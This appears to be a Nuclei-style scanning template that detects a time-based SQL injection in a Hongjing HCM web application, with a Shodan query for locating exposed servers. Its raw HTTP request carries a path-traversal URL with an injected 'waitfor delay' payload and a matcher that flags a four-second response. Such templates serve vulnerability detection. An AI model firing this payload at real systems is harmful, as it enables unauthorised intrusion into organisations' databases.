id: Hongjing_Herm_Infusch_SQLi

info:
  name: Hongjing_Herm_Infusch_SQLi
  author: HK
  severity: high
  description: Hongjing Herm Infusch injected
  metadata:
    max-request: 1
    shodan-query: body="/images/hcm/themes/default/login/li.png"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /templates/attestation/../../general/info/view?kind=1&a0100=1';waitfor+delay+'0:0:4'+-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: none
    Sec-Fetch-User: ?1

  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 4'